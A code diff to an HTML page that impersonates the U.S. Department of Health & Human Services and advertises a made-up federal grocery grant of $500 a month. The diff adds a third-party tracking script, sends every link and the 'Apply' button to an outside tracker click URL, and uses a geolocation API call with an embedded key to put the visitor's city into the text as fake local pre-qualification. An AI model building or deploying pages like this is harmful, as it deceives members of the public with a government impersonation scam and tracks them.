@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>U.S. Department of Health & Human Services</title>
+    <script type="text/javascript" src="//hpkpn.ttrk.io/track.js"></script>
     <style>
         body {
             font-family: sans-serif;
@@ -26,7 +27,7 @@
             color: white;
             padding: 20px 0;
             text-align: left;
-            margin-bottom: 0;
+            margin-bottom: 20px;
         }
 
         .hhs-header .container {
@@ -202,8 +203,8 @@
     <div class="breadcrumb-nav">
         <div class="container">
             <ul>
-                <li><a href="#">Home</a></li>
-                <li><a href="#">Benefits</a></li>
+                <li><a href="https://hpkpn.ttrk.io/click">Home</a></li>
+                <li><a href="https://hpkpn.ttrk.io/click">Benefits</a></li>
                 <li>Grocery Assistance Program</li>
             </ul>
         </div>
@@ -217,11 +218,11 @@
         </div>
 
         <div class="hhs-status-box">
-            <strong>Pre-Qualified:</strong> Based on your location in Enterprise, Nevada, United States, you meet the initial requirements for this program.
+            <strong>Pre-Qualified:</strong> Based on your location in <span id="user-location"></span>, you meet the initial requirements for this program.
         </div>
 
         <p style="margin-bottom: 20px;">
-            <strong>New Federal Program:</strong> Qualifying individuals and families in Enterprise, Nevada can now receive up to $500 per month to help with grocery expenses as part of a new federal program. This initiative aims to support residents by easing the financial burden of food costs and promoting better nutrition.
+            <strong>New Federal Program:</strong> Qualifying individuals and families in <span id="user-location-body"></span> can now receive up to $500 per month to help with grocery expenses as part of a new federal program. This initiative aims to support residents by easing the financial burden of food costs and promoting better nutrition.
         </p>
 
         <div class="hhs-benefit-box">
@@ -230,13 +231,13 @@
             <p style="font-size: 14px; margin-top: 5px;">Benefits are provided on a reloadable card accepted at participating retailers.</p>
         </div>
 
-        <a href="#" class="hhs-cta-button" style="display: block; text-align: center; margin-bottom: 10px;">Apply for Grocery Assistance</a>
+        <a href="https://hpkpn.ttrk.io/click" class="hhs-cta-button" style="display: block; text-align: center; margin-bottom: 10px;">Apply for Grocery Assistance</a>
         <p style="text-align: center; font-size: 14px; color: #555; margin-bottom: 30px;">Free • No Obligation • Secure Application</p>
 
         <div class="hhs-how-it-works">
             <h4>How the Program Works</h4>
             <ul class="hhs-checkmark-list">
-                <li>Eligible residents of Enterprise, Nevada are pre-qualified.</li>
+                <li>Eligible residents of <span id="user-location-list"></span> are pre-qualified.</li>
                 <li>Monthly benefits are loaded onto a secure payment card.</li>
                 <li>Use the card at authorized grocery stores and supermarkets.</li>
                 <li>Purchase nutritious foods, including fruits, vegetables, and other staples.</li>
@@ -254,23 +255,45 @@
                 <li>Non-alcoholic beverages</li>
                 <li>Other essential grocery items</li>
             </ul>
-            <p style="margin-top: 20px; font-size: 14px;">Upon approval, your benefits card will be mailed to your address in Enterprise, Nevada, and will be ready for immediate use at participating locations.</p>
+            <p style="margin-top: 20px; font-size: 14px;">Upon approval, your benefits card will be mailed to your address in <span id="user-location-footer"></span>, and will be ready for immediate use at participating locations.</p>
         </div>
     </div>
 
     <div class="hhs-footer">
         <div class="container">
-            <a href="#">Contact Us</a> | <a href="#">Help</a> | <a href="#">Privacy Policy</a> | <a href="#">Accessibility</a>
+            <a href="https://hpkpn.ttrk.io/click">Contact Us</a> | <a href="https://hpkpn.ttrk.io/click">Help</a> | <a href="https://hpkpn.ttrk.io/click">Privacy Policy</a> | <a href="https://hpkpn.ttrk.io/click">Accessibility</a>
             <p style="margin-top: 10px;">An official website of the U.S. Government</p>
         </div>
     </div>
 
     <script>
         document.addEventListener("DOMContentLoaded", function() {
-            // No dynamic functionality needed for this specific page design.
-            // All content is static.
+            // Get all elements that need to be updated with the user's location
+            const locationElements = document.querySelectorAll('#user-location, #user-location-body, #user-location-list, #user-location-footer');
+
+            // Get real geo-location using ipify API
+            fetch('https://geo.ipify.org/api/v2/country,city?apiKey=at_JKtyyWskmuI07I6RieQ3a6EBhlt5T')
+                .then(response => response.json())
+                .then(data => {
+                    const city = data.location.city;
+                    const region = data.location.region;
+                    const country = data.location.country;
+                    
+                    const userLocation = `${city}, ${region}`;
+                    const userLocationFull = `${city}, ${region}, ${country}`;
+
+                    locationElements.forEach(element => {
+                        if (element.id === 'user-location-list' || element.id === 'user-location-footer') {
+                            element.textContent = userLocation;
+                        } else {
+                            element.textContent = userLocationFull;
+                        }
+                    });
+                })
+                .catch(error => {
+                    console.error('Error fetching location:', error);
+                });
         });
     </script>
-
 </body>
 </html>
